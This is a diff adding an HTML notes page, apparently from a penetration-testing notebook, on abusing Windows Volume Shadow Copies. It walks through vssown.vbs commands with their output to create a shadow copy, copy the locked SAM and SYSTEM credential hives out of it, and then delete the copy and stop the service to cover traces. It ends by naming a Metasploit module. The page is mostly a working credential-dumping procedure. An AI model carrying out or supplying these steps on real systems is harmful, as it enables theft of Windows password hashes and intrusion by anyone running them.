@@ -1,0 +1,96 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Shadow Copies</title>
+</head><body>Also look at the ADD (ntds.dit) page regarding VSS, Ninjacopy, and DiskShadow<br/>
+<br/>
+It consists of abusing the Volume Shadow Copies functionality in modern Windows operating systems to access locked system files like C:\Windows\System32\config's SAM and SYSTEM and others.<br/>
+<br/>
+You can use the Volume Shadow Copy Management command line interface, vssown, to leverage this technique as follows.<br/>
+<br/>
+<b>List shadow copies:</b><br/>
+C:\&gt;cscript vssown.vbs /list<br/>
+Microsoft (R) Windows Script Host Version 5.8<br/>
+Copyright (C) Microsoft Corporation. All rights reserved.<br/>
+SHADOW COPIES<br/>
+=============<br/>
+As expected, no shadow copies initially.<br/>
+<br/>
+<b>Verify the status of the Volume Shadow Service (VSS):</b><br/>
+C:\&gt;cscript vssown.vbs /status<br/>
+Microsoft (R) Windows Script Host Version 5.8<br/>
+Copyright (C) Microsoft Corporation. All rights reserved. <br/>
+[*] Stopped<br/>
+<br/>
+C:\&gt;cscript vssown.vbs /mode<br/>
+Microsoft (R) Windows Script Host Version 5.8<br/>
+Copyright (C) Microsoft Corporation. All rights reserved. <br/>
+[*] VSS service set to 'Manual' start mode.<br/>
+<br/>
+In this case, once we are done, we need to restore it to the initial state (Stopped).<br/>
+<br/>
+<b>Create a new shadow copy:</b><br/>
+C:\&gt;cscript vssown.vbs /create<br/>
+Microsoft (R) Windows Script Host Version 5.8<br/>
+Copyright (C) Microsoft Corporation. All rights reserved. <br/>
+[*] Attempting to create a shadow copy.<br/>
+<br/>
+<b>Verify that the shadow copy has been created:</b><br/>
+C:\&gt;cscript vssown.vbs /list<br/>
+Microsoft (R) Windows Script Host Version 5.8<br/>
+Copyright (C) Microsoft Corporation. All rights reserved. <br/>
+SHADOW COPIES<br/>
+============= <br/>
+[*] ID: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;{D79A4E73-CCAB-4151-B726-55F6C5C3A853}<br/>
+[*] Client accessible: &nbsp; True<br/>
+[*] Count: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 1<br/>
+[*] Device object: &nbsp; &nbsp; &nbsp; \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1<br/>
+[*] Differnetial: &nbsp; &nbsp; &nbsp; &nbsp;True<br/>
+[*] Exposed locally: &nbsp; &nbsp; False<br/>
+[*] Exposed name:<br/>
+[*] Exposed remotely: &nbsp; &nbsp;False<br/>
+[*] Hardware assisted: &nbsp; False<br/>
+[*] Imported: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False<br/>
+[*] No auto release: &nbsp; &nbsp; True<br/>
+[*] Not surfaced: &nbsp; &nbsp; &nbsp; &nbsp;False<br/>
+[*] No writers: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;True<br/>
+[*] Originating machine: LAPTOP<br/>
+[*] Persistent: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;True<br/>
+[*] Plex: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False<br/>
+[*] Provider ID: &nbsp; &nbsp; &nbsp; &nbsp; {B5946137-7B9F-4925-AF80-51ABD60B20D5}<br/>
+[*] Service machine: &nbsp; &nbsp; LAPTOP<br/>
+[*] Set ID: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;{018D7854-5A28-42AE-8B10-99138C37112F}<br/>
+[*] State: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 12<br/>
+[*] Transportable: &nbsp; &nbsp; &nbsp; False<br/>
+[*] Volume name: &nbsp; &nbsp; &nbsp; &nbsp; \\?\Volume{46f5ef63-8cca-11e0-88ac-806e6f6e6963}\<br/>
+<br/>
+You need to<b>&nbsp;take note of the Device object value</b>&nbsp;for the next step <b>and the ID</b>&nbsp;for the cleanup step.<br/>
+<br/>
+<b>Pull the following files from a shadow copy:</b><br/>
+C:\&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .C:\&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .<br/>
+<br/>
+You have just copied over SAM and SYSTEM files from the shadow copy to the C:\ root folder.<br/>
+<br/>
+<br/>
+<b>Cleanup:</b><br/>
+C:\&gt;cscript vssown.vbs /delete {D79A4E73-CCAB-4151-B726-55F6C5C3A853}<br/>
+Microsoft (R) Windows Script Host Version 5.8<br/>
+Copyright (C) Microsoft Corporation. All rights reserved.<br/>
+[*] Attempting to delete shadow copy with ID: {D79A4E73-CCAB-4151-B726-55F6C5C3A853}<br/>
+<br/>
+<b>Eventually, restore to original Stop status:</b><br/>
+C:\&gt;cscript vssown.vbs /stop<br/>
+Microsoft (R) Windows Script Host Version 5.8<br/>
+Copyright (C) Microsoft Corporation. All rights reserved.<br/>
+[*] Signal sent to stop the VSS service.<br/>
+<br/>
+<br/>
+There is a metasploit module to manage Shadow Copies:<br/>
+post/windows/manage:<ul><li>create</li>
+<li>list</li>
+<li>mount</li>
+<li>set_storage</li>
+<li>storage</li>
+</ul>
+</body></html>
